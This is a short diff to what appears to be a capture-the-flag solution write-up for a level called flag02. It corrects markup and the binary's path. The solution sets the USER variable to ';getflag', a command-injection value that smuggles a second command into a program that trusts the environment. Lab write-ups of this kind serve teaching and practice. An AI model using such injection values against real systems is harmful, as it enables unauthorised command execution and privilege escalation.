@@ -16,9 +16,9 @@ Solution
 
 Export a variable call :bash:`USER` like this:
 
-::bash:`$export USER=";getflag"`
+:bash:`$export USER=";getflag"`
 
 and then run :bash:`flag02`
 
-:bash:`./flag02`
+:bash:`/home/flag02/flag02`
 
